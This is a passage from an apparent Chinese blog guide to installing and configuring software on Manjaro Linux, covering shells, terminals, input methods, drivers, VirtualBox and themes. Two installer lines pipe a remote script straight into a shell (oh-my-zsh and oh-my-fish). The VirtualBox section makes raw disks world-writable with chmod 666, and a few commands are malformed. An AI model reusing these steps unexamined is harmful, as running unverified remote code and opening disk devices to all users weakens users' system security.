<p>修改的配置文件位于 <code>~/.config/yay/config.json</code> ，可通过查看修改过的配置：<code>yay -P -g</code></p>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S vim</span><br></pre></td></tr></table></figure>
<p>vim美化</p>
<p><strong>将vim设置为默认编辑器</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/profile</span><br><span class="line"><span class="comment"># 或在个人环境变量文件</span></span><br><span class="line">vim ~/.bash_profile</span><br><span class="line"><span class="comment">#加入</span></span><br><span class="line"><span class="built_in">export</span> EDITOR=vim</span><br></pre></td></tr></table></figure>
<h3 id="zsh-manjaro默认安装-（bash兼容高于fish）"><a href="#zsh-manjaro默认安装-（bash兼容高于fish）" class="headerlink" title="zsh(manjaro默认安装)（bash兼容高于fish）"></a>zsh(manjaro默认安装)（bash兼容高于fish）</h3><p>zsh对bash的兼容高所以建议普通使用用fish，root用户或需要运行bash脚本时用zsh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S zsh</span><br><span class="line"><span class="comment"># bash安装oh-my-zsh</span></span><br><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line"><span class="comment"># 更换默认的shell</span></span><br><span class="line">chsh -s /bin/zsh</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置</span></span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 修改如下</span></span><br><span class="line"><span class="comment"># 主题 avit、ys</span></span><br><span class="line">ZSH_THEME=<span class="string">&quot;ys&quot;</span></span><br><span class="line"></span><br><span class="line">plugins=(</span><br><span class="line">	git</span><br><span class="line">	sudo</span><br><span class="line">)</span><br><span class="line"><span class="comment">#两次ESC自动补全sudo</span></span><br></pre></td></tr></table></figure>
<h3 id="fish-用户交互好"><a href="#fish-用户交互好" class="headerlink" title="fish(用户交互好)"></a>fish(用户交互好)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fish</span><br><span class="line">curl -L https://get.oh-my.fish |fish</span><br><span class="line">fish_config		<span class="comment">#选择想要的主题配置关闭网页，到终端回车即可</span></span><br><span class="line">chsh -s /usr/bin/fish</span><br></pre></td></tr></table></figure>
<p><strong>fish环境变量设置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/fish/config.fish		<span class="comment">#新建或打开fish配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set PATH $PYTHON_HOME&#x2F;bin $DEV_HOME&#x2F;apache&#x2F;bin $PATH</span><br><span class="line"># fish的变量直接用 set 变量名 变量值1 变量值2 ... 进行设置，中间用空格隔开</span><br></pre></td></tr></table></figure>
<h3 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S alacritty</span><br><span class="line">vim ~/.config/alacritty/alacritty.yml</span><br><span class="line"><span class="comment">#修改窗口</span></span><br><span class="line"><span class="comment">#窗口</span></span><br><span class="line">window:</span><br><span class="line">  <span class="comment">#尺寸</span></span><br><span class="line">  dimensions:</span><br><span class="line">    <span class="comment">#列</span></span><br><span class="line">    columns:88</span><br><span class="line">    <span class="comment">#行</span></span><br><span class="line">    lines:25</span><br><span class="line">  <span class="comment">#位置（像素为单位）</span></span><br><span class="line">  position:</span><br><span class="line">    x:345</span><br><span class="line">    y:100</span><br><span class="line">  <span class="comment">#填充</span></span><br><span class="line">  padding:</span><br><span class="line">    x:15</span><br><span class="line">    y:15</span><br><span class="line"></span><br><span class="line"><span class="comment">#将字体更改Hack</span></span><br><span class="line"><span class="comment">#字体配置（更改需要重启）</span></span><br><span class="line"><span class="comment">#字体：</span></span><br><span class="line">font:</span><br><span class="line">  <span class="comment">#正常：</span></span><br><span class="line">  normal:</span><br><span class="line">    family: Hack</span><br><span class="line">    <span class="comment">#风格可以指定选择一个特定的类型</span></span><br><span class="line">    <span class="comment">#风格：</span></span><br><span class="line">    style: Regular</span><br><span class="line">  <span class="comment">#粗体字型</span></span><br><span class="line">  bold:</span><br><span class="line">    family: Hack</span><br><span class="line">    style: Bold</span><br><span class="line">  <span class="comment">#斜体字型</span></span><br><span class="line">  italic:</span><br><span class="line">    family: Hack</span><br><span class="line">    style: Italic</span><br><span class="line"><span class="comment">#透明度</span></span><br><span class="line">background_opacity: 0.8</span><br><span class="line"></span><br><span class="line"><span class="comment">#别的终端</span></span><br><span class="line">sudo pacman -S tilix</span><br><span class="line">sudo pacman -S deepin-terminal</span><br></pre></td></tr></table></figure>
<h3 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h3><p><strong>gnome桌面集成令<code>ibus</code>，建议使用<code>ibus-rime</code> ,搜狗常常会出现候选框中文乱码问题，暂时无解</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S fcitx-qt4 fcitx-qt5</span><br><span class="line">sudo pacman -S fcitx-sogoupinyin fcitx-configtool</span><br><span class="line"><span class="comment">#先打开Fcitx，再打开Fcitx配置讲搜狗拼音放到顶部，删除其余的，只保留 “搜狗拼音” 和 “键盘-汉语”</span></span><br><span class="line"></span><br><span class="line">gedit ~/.xprofile</span><br><span class="line"><span class="comment">#加入：</span></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=fcitx</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">&quot;@im=fcitx&quot;</span></span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#出现“搜狗输入法异常！请删除.config/SogouPY 并重启”解决办法：</span></span><br><span class="line"><span class="comment">#安装fcitx-qt4</span></span><br><span class="line">sudo pacman -S fcitx-qt4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出现候选框中文乱码问题</span></span><br><span class="line"><span class="comment"># 有说删除 .config/SogouPY* 和 .config/sogou*</span></span><br><span class="line"><span class="comment"># 有说装 fcitx-ui-light</span></span><br><span class="line"><span class="comment"># 有说修改输入法字体</span></span><br><span class="line"><span class="comment"># 有说修改 Fcitx配置--&gt;附加组件--&gt;简繁转换</span></span><br><span class="line"><span class="comment"># 上面打方法都没能解决，果断放弃跳槽IBus，只是搜狗输入法会这样，不跳槽也可使用fcitx的其它输入法</span></span><br></pre></td></tr></table></figure></p>
<h3 id="git-manjaro默认安装"><a href="#git-manjaro默认安装" class="headerlink" title="git(manjaro默认安装)"></a>git(manjaro默认安装)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S git</span><br></pre></td></tr></table></figure>
<h3 id="jdk"><a href="#jdk" class="headerlink" title="jdk"></a>jdk</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jdk8-openjdk</span><br></pre></td></tr></table></figure>
<h3 id="jre"><a href="#jre" class="headerlink" title="jre"></a>jre</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S jre8-openjdk jre8-openjdk-headless</span><br></pre></td></tr></table></figure>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S adobe-source-han-sans-cn-fonts ttf-hack</span><br></pre></td></tr></table></figure>
<h3 id="wps"><a href="#wps" class="headerlink" title="wps"></a>wps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S wps-office-cn ttf-wps-fonts wps-office-mui-zh-cn</span><br><span class="line"><span class="comment">#卸载自带office</span></span><br><span class="line">sudo pacman -Rcc libreoffice-still</span><br><span class="line">sudo pacman -Rcc microsoft-office-online-jak</span><br></pre></td></tr></table></figure>
<h3 id="markdown编辑器"><a href="#markdown编辑器" class="headerlink" title="markdown编辑器"></a>markdown编辑器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S typora</span><br></pre></td></tr></table></figure>
<h3 id="sublime-text"><a href="#sublime-text" class="headerlink" title="sublime-text"></a>sublime-text</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yay sublime-text-dev</span><br></pre></td></tr></table></figure>
<h3 id="CHM-查看器"><a href="#CHM-查看器" class="headerlink" title="CHM 查看器"></a>CHM 查看器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pacman -S kchmviewer</span><br></pre></td></tr></table></figure>
<h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S chromium</span><br><span class="line">sudo pacman -S firefox firefox-i18n-zh-cn</span><br></pre></td></tr></table></figure>
<h3 id="flash"><a href="#flash" class="headerlink" title="flash :"></a>flash :</h3><ul>
<li><p><code>ActiveX</code>：适用于Windows 7、Vista、XP系统IE内核浏览器、本地视频、游戏客户端</p>
</li>
<li><p><code>NPAPI</code>：适用于FireFox（火狐）、Safari（苹果）、Opera （欧朋，12.17版以下）</p>
</li>
<li><p><code>PPAPI</code>：适用于Chromium浏览器、Opera （欧朋，15.00版以上）</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay flashplugin		<span class="comment"># NPAPI</span></span><br><span class="line">yay pepper-flash	<span class="comment"># PPAPI</span></span><br></pre></td></tr></table></figure>
<h3 id="TIM-QQ"><a href="#TIM-QQ" class="headerlink" title="TIM/QQ"></a>TIM/QQ</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S deepin.com.qq.office		<span class="comment">#TIM</span></span><br><span class="line">sudo pacman -S deepin.com.qq.im			<span class="comment">#QQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#配置TIM字体主题</span></span><br><span class="line">sudo pacman -S wine wine-mono</span><br><span class="line">env WINEPREFIX=<span class="string">&quot;<span class="variable">$HOME</span>/.deepinwine/Deepin-TIM&quot;</span> winecfg	<span class="comment">#显示&gt;屏幕分辨率&gt;125</span></span><br></pre></td></tr></table></figure>
<h3 id="微信"><a href="#微信" class="headerlink" title="微信"></a>微信</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay deepin-wine-wechat		<span class="comment">#deepin-wine版</span></span><br><span class="line">sudo pacman -S electronic-wechat	<span class="comment">#网页版，账号安全可能导致网页版登录不了，无解，建议使用deepin-wine版</span></span><br></pre></td></tr></table></figure>
<h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><h4 id="Listen1"><a href="#Listen1" class="headerlink" title="Listen1"></a>Listen1</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay listen1-desktop</span><br></pre></td></tr></table></figure>
<h4 id="网易云音乐"><a href="#网易云音乐" class="headerlink" title="网易云音乐"></a>网易云音乐</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S netease-cloud-music</span><br></pre></td></tr></table></figure>
<h4 id="cocomusic-QQ音乐"><a href="#cocomusic-QQ音乐" class="headerlink" title="cocomusic(QQ音乐)"></a>cocomusic(QQ音乐)</h4><p><a href="https://github.com/xtuJSer/CoCoMusic/releases">下载安装包</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -U cocomusic-*.pacman</span><br></pre></td></tr></table></figure>
<h3 id="有道词典"><a href="#有道词典" class="headerlink" title="有道词典"></a>有道词典</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay youdao-dict</span><br></pre></td></tr></table></figure>
<h3 id="百度网盘"><a href="#百度网盘" class="headerlink" title="百度网盘"></a>百度网盘</h3><p><strong>GUI</strong>:<br><code>yay baidunetdisk-bin</code></p>
<p>创建软链接:</p>
<p><code>sudo ln -s /usr/lib/baidunetdisk/baidunetdisk /usr/bin/baidunetdisk</code></p>
<p><strong>命令行版</strong>:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay baidupcs-go		<span class="comment">#go版</span></span><br><span class="line">yay bypy			<span class="comment">#Python版	也可用pip安装：sudo pip bypy</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#项目地址：</span></span><br><span class="line">https://github.com/iikira/BaiduPCS-Go</span><br><span class="line">https://github.com/houtianze/bypy</span><br></pre></td></tr></table></figure></p>
<h3 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S python-pip</span><br></pre></td></tr></table></figure>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看内核</span></span><br><span class="line">uname -r</span><br><span class="line"><span class="comment">#选择相应内核版本的安装,virtualbox-host-modules</span></span><br><span class="line">sudo pacman -S virtualbox</span><br><span class="line"><span class="comment">#安装扩展</span></span><br><span class="line">yay virtualbox-ext-oracle</span><br><span class="line"><span class="comment">#载入vboxdrv模块</span></span><br><span class="line">sudo modprobe vboxdrv</span><br><span class="line"><span class="comment">#将用户eonun添加进vboxusers用户组</span></span><br><span class="line">sudo usermod -a -G vboxusers eonun</span><br><span class="line"><span class="comment">#检查是否加入</span></span><br><span class="line">cat /etc/group | grep vbox</span><br><span class="line">  vboxusers:x:129:eonun</span><br><span class="line"><span class="comment">#安装完成后重启即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#创建物理磁盘的虚拟磁盘，用来挂载到虚拟机上方便访问</span></span><br><span class="line"><span class="comment">#将整个物理磁盘用作虚拟磁盘</span></span><br><span class="line">sudo chmod 666 /dev/sda		<span class="comment">#添加读写权限</span></span><br><span class="line">vboxmanage internalcommands createrawvmdk -filename /home/eonun/data/win10/SD/sda.vmdk -rawdisk /dev/sda -relative</span><br><span class="line"></span><br><span class="line"><span class="comment">#将单个分区用作虚拟磁盘</span></span><br><span class="line">sudo chmod 666 /dev/sda2</span><br><span class="line">vboxmanage internalcommands createrawvmdk -filename /home/eonun/data/win10/SD/Software.vmdk -rawdisk /dev/sda2 -relative</span><br><span class="line"></span><br><span class="line"><span class="comment">#若虚拟机是Windows，且把硬盘格式化为NTFS格式，若想在下次启动Linux的时候使用这个物理盘就需要将Windows关机，挂起会使物理硬盘被Windows锁死，Linux对其只有读权限</span></span><br><span class="line">sudo chmod 666 /dev/sda</span><br><span class="line"><span class="comment">#也可创建开机自定义脚本运行</span></span><br></pre></td></tr></table></figure>
<h3 id="teamviewer远程工具"><a href="#teamviewer远程工具" class="headerlink" title="teamviewer远程工具"></a>teamviewer远程工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S teamviewer</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> teamviewerd		<span class="comment">#将其服务设置开机启动</span></span><br></pre></td></tr></table></figure>
<h3 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S visual-studio-code-bin</span><br></pre></td></tr></table></figure>
<h3 id="显卡驱动"><a href="#显卡驱动" class="headerlink" title="显卡驱动"></a>显卡驱动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">sudo pacman -S virtualgl lib32-virtualgl lib32-primus primus</span><br><span class="line"><span class="comment">#安装闭源bumblebee版驱动</span></span><br><span class="line">sudo mhwd -f -i pci video-hybrid-intel-nvidia-prime</span><br><span class="line"><span class="comment">#讲用户加入到bumblee组</span></span><br><span class="line">sudo gpasswd -a <span class="variable">$USER</span> bumblebee</span><br><span class="line"><span class="comment">#设置bumblebeed开机自启</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> bumblebeed</span><br><span class="line"><span class="comment">#很多硬件厂商的BIOS驱动对Linux不友好，无法顺利加载ACPI模块，从而导致无法驱动独立显卡，这就需要修改grub启动文件使ACPI模块能正常工作</span></span><br><span class="line">sudo vim /etc/default/grub</span><br><span class="line"><span class="comment">#在 GRUB_CMDLINE_LINUX_DEFAULT 中加入 acpi_osi=’Windows 2009’</span></span><br><span class="line"><span class="comment">#acpi_osi=’Windows 2009’是告诉ACPI模块，这是‘Windows 7’，模拟Windows让其继续运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如：</span></span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT=<span class="string">&quot;quiet acpi_osi=! acpi_osi=’Windows 2009’ resume=UUID=2d6d6716-4886-49ff-a277-55ba5d9f19d8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新grub文件，使永久有效</span></span><br><span class="line">sudo update-grub</span><br><span class="line"><span class="comment">#重启</span></span><br><span class="line">reboot</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装性能测试软件</span></span><br><span class="line">sudo pacman -S mesa-demos</span><br><span class="line">sudo pacman -S glmark2</span><br><span class="line"><span class="comment">#测试集显性能</span></span><br><span class="line">glxgears</span><br><span class="line">glmark2</span><br><span class="line"><span class="comment">#测试独显性能</span></span><br><span class="line">optirun glxgears</span><br><span class="line">optirun glmark2</span><br><span class="line"><span class="comment">#NVIDIA setting面板打不开使用以下命令</span></span><br><span class="line">optirun -b none nvidia-settings -c :8</span><br></pre></td></tr></table></figure>
<p><strong>使用optimus-manager管理显卡</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S optimus-manager optimus-manager-qt</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> optimus-manager</span><br></pre></td></tr></table></figure>
<p>更多参考: <a href="/posts/4a637166/">Linux独立显卡驱动安装</a></p>
<h3 id="文件管理器"><a href="#文件管理器" class="headerlink" title="文件管理器"></a>文件管理器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S ranger</span><br><span class="line">xdg-mime query default inode/directory	<span class="comment">#查看默认文件管理器</span></span><br><span class="line">xdg-mime default  org.gnome.Nautilus.desktop inode/directory <span class="comment">#修改默认文件管理器</span></span><br><span class="line"><span class="comment">#ranger.desktop		ranger文件管理器</span></span><br><span class="line"><span class="comment">#org.gnome.Nautilus.desktop		gnome文件管理器</span></span><br><span class="line">sudo pacman -S w3m	<span class="comment">#安装预览图片的支持库</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成配置</span></span><br><span class="line">ranger --copy-config=all</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 ~/.config/ranger/ 下生成一系列配置文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用文件预览功能，需配置 rc.conf</span></span><br><span class="line"><span class="comment"># “set use_preview_script” 一行，值设为“true”。启用scope.sh脚本，用于各种文件的预览</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># “set preview_script”一行，值设为“~/.config/ranger/scope.sh”，为预览功能指定脚本文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># “set preview_images”一行，值设为“true”，用对图片的预览功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># “set preview_images_method”一行，值设为“w3m”，用w3m作为图片预览的工具</span></span><br><span class="line"></span><br><span class="line">在使用w3m的中出现缺少 w3mimgdisplay 时安装 w3m-img</span><br></pre></td></tr></table></figure>
<p><a href="https://www.dazhuanlan.com/2020/03/25/5e7a39293a8b7/?__cf_chl_jschl_tk__=82a2c70dc8a3cc361499a0824268e12fe7525522-1600529579-0-AfAKSZbmuEDLQLxUolVbojJS83b9aOlh5-jWq0NVXU4zOSmzZiNuwqprRaoNDdGKG471E8hmiLUrxNmJ_y5SdXLzKypWHw5Z60bbWFPZf7Q6DWFu2Jq26yJO1Jqe5Glu1WLq6AZdEYsmgBqh4NW2Ntjm7GbGZS7jpushXhGalTuXjfdoGD2j8Ph0v_kqNqM8aBVSIt0uAT_7G_SUpy2uTRlVT22adVTv8uLpB1B4Dgg20rzgYTnASSOeA933B2XGFdAWCH5aIe1GWZ8t1K95A1M5cpZI5jccFeoLSPxE0ZPdRTgBZcci1Oawo-I3aYiiiQ">Linux命令行文件管理器Ranger</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Ranger_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87">ranger (简体中文) archwiki</a>)</p>
<p>从终端中打开当前文件夹的文件管理器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nautilus .   # gnome桌面文件管理</span><br><span class="line">thunar .     # xfce桌面文件管理</span><br></pre></td></tr></table></figure>
<h3 id="启动盘制作器"><a href="#启动盘制作器" class="headerlink" title="启动盘制作器"></a>启动盘制作器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S etcher</span><br></pre></td></tr></table></figure>
<h3 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S net-tools	<span class="comment">#ifconfig等</span></span><br></pre></td></tr></table></figure>
<h3 id="Nautilus扩展"><a href="#Nautilus扩展" class="headerlink" title="Nautilus扩展"></a>Nautilus扩展</h3><p>Nautilus（鹦鹉螺）是GNOME桌面文件浏览器</p>
<p>Nautilus的Python绑定，允许Nautilus属性页和菜单项扩展用Python编写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S python-nautilus</span><br></pre></td></tr></table></figure>
<h3 id="截图工具"><a href="#截图工具" class="headerlink" title="截图工具"></a>截图工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S flameshot</span><br><span class="line"><span class="comment">#添加快捷键的命令 ： flameshot gui</span></span><br></pre></td></tr></table></figure>
<h3 id="系统信息工具"><a href="#系统信息工具" class="headerlink" title="系统信息工具"></a>系统信息工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S neofetch</span><br><span class="line">sudo pacman -S screenfetch</span><br></pre></td></tr></table></figure>
<h3 id="主题修改工具"><a href="#主题修改工具" class="headerlink" title="主题修改工具"></a>主题修改工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S lxappearance</span><br></pre></td></tr></table></figure>
<h3 id="桌面"><a href="#桌面" class="headerlink" title="桌面"></a>桌面</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S feh</span><br></pre></td></tr></table></figure>
<h3 id="壁纸管理器结合feh用"><a href="#壁纸管理器结合feh用" class="headerlink" title="壁纸管理器结合feh用"></a>壁纸管理器结合feh用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S variety</span><br></pre></td></tr></table></figure>
<h3 id="渲染器"><a href="#渲染器" class="headerlink" title="渲染器"></a>渲染器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S compton</span><br></pre></td></tr></table></figure>
<h3 id="视屏剪辑"><a href="#视屏剪辑" class="headerlink" title="视屏剪辑"></a>视屏剪辑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S kdenlive</span><br></pre></td></tr></table></figure>
<h3 id="修图"><a href="#修图" class="headerlink" title="修图"></a>修图</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gimp</span><br></pre></td></tr></table></figure>
<h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S thunderbird</span><br></pre></td></tr></table></figure>
<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S smplayer</span><br><span class="line">sudo pacman -S smplayer-themes <span class="comment">#安装主题,首选项-&gt;界面-&gt;图标集 推荐Papirus</span></span><br></pre></td></tr></table></figure>
<h3 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S uget aria2	<span class="comment">#打开uget编辑&gt;设置&gt;插件选择aria2</span></span><br><span class="line">sudo pacman -S transmission-gtk <span class="comment"># 或 transmission-qt transmission-cli</span></span><br><span class="line"></span><br><span class="line">yay qbittorrent-enhanced-git</span><br><span class="line">yay motrix</span><br><span class="line">yay xdman</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/XIU2/TrackersListCollection/blob/master/README-ZH.md"><code>BT Tracker</code> 加速配置</a></p>
<h3 id="dock栏"><a href="#dock栏" class="headerlink" title="dock栏"></a>dock栏</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S plank</span><br></pre></td></tr></table></figure>
<p>配置开机启动：<br>优化<code>---&gt;</code>开机启动程序<code>---&gt;</code>添加即可</p>
<h3 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h3><h4 id="ss-UI"><a href="#ss-UI" class="headerlink" title="ss UI"></a>ss UI</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay shadowsocks-qt5</span><br></pre></td></tr></table></figure>
<h4 id="V2Ray-UI"><a href="#V2Ray-UI" class="headerlink" title="V2Ray UI"></a>V2Ray UI</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -S qv2ray</span><br></pre></td></tr></table></figure>
<h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p><a href="https://www.gnome-look.org">Gnome</a></p>
<p><a href="https://www.xfce-look.org">Xfce</a><br>``<br>可通过<a href="https://www.opendesktop.org/p/1136805/">ocs-url</a>或<a href="https://www.opendesktop.org/p/1175480/">ocs-store</a>来安装主题</p>
<p>或将图标文件放到<code>~/.local/share/icons</code>;主题放在<code>~/.themes</code>；光标放在<code>~/.icons</code></p>
<p>Manjaro 通过外观号和窗口管理器设置使用主题图标，鼠标和触摸板设置光标样式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#主题包安装，选一个喜欢的即可</span></span><br><span class="line">sudo pacman -S flat-remix-git</span><br><span class="line">yay sweet-theme-git</span><br><span class="line">sudo pacman vimix-gtk-themes</span><br><span class="line"><span class="comment">#主题推荐：Flat-Remix-GTK-Blue-Darkest-NoBorder,Sweet-Dark,vimix-dark-doder</span></span><br><span class="line"><span class="comment">#shell(系统交互界面)：Flat-Remix-Darkest-fullPanel</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#图标</span></span><br><span class="line"><span class="comment">#Tela-icon-theme (Tela blue dark)</span></span><br><span class="line"><span class="comment">#光标</span></span><br><span class="line"><span class="comment">#Pulse Glass ， Bibata ， DasBlack ， Capitaine Cursors , vimix cursors</span></span><br></pre></td></tr></table></figure>
<h3 id="配置编辑工具-理解为-Linux-的注册表"><a href="#配置编辑工具-理解为-Linux-的注册表" class="headerlink" title="配置编辑工具(理解为 Linux 的注册表)"></a>配置编辑工具(理解为 Linux 的注册表)</h3><p>Gconf Editor是一个配置编辑软件，它允许用户修改桌面环境和应用程序的相关参数值，实现改变桌面环境显示和应用程序属性。例如修改菜单按钮的图标，窗口关闭按钮的左右位置，登录界面背景等</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S gconf-editor</span><br></pre></td></tr></table></figure>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="软件包管理工具使用"><a href="#软件包管理工具使用" class="headerlink" title="软件包管理工具使用"></a>软件包管理工具使用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S		<span class="comment">#安装软件</span></span><br><span class="line">sudo pacman -Ss		<span class="comment">#搜索软件相关包</span></span><br><span class="line">sudo pacman -Sy		<span class="comment">#同步软件包数据库</span></span><br><span class="line">sudo pacman -Syy	<span class="comment">#强制同步软件包数据库</span></span><br><span class="line">sudo pacman -Su		<span class="comment">#更新软件、系统</span></span><br><span class="line">sudo pacman -Sc		<span class="comment">#删除下载的包</span></span><br><span class="line">sudo pacman -Scc	<span class="comment">#删除下载的包和数据库</span></span><br><span class="line"></span><br><span class="line">sudo pacman -Q		<span class="comment">#查看安装的软件</span></span><br><span class="line">sudo pacman -Qi		<span class="comment">#查看安装的软件的详细信息</span></span><br><span class="line">sudo pacman -Qo		<span class="comment">#查找文件属于哪个包</span></span><br><span class="line">sudo pacman -Qdtq	<span class="comment">#列出不再被依赖的包，并不显示版本号</span></span><br><span class="line"></span><br><span class="line">sudo pacman -R		<span class="comment">#删除软件</span></span><br><span class="line">sudo pacman -Rsc	<span class="comment">#删除软件及其依赖包</span></span><br></pre></td></tr></table></figure>
<h3 id="捕捉键盘英文输入，中文输入法会不兼容"><a href="#捕捉键盘英文输入，中文输入法会不兼容" class="headerlink" title="捕捉键盘英文输入，中文输入法会不兼容"></a>捕捉键盘英文输入，中文输入法会不兼容</h3><p>screenkey</p>
<h3 id="桌面-1"><a href="#桌面-1" class="headerlink" title="桌面"></a>桌面</h3><h4 id="i3wm"><a href="#i3wm" class="headerlink" title="i3wm"></a>i3wm</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S i3-gaps</span><br></pre></td></tr></table></figure>
<p><strong>i3上方的蓝色框</strong></p>
<p>编辑配置文件，添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">new_window 1pixel</span><br></pre></td></tr></table></figure>
<p><strong>i3边框</strong></p>
<p>需要 i3-gaps 版本的i3</p>
<p>编辑配置文件，在末尾添加</p>
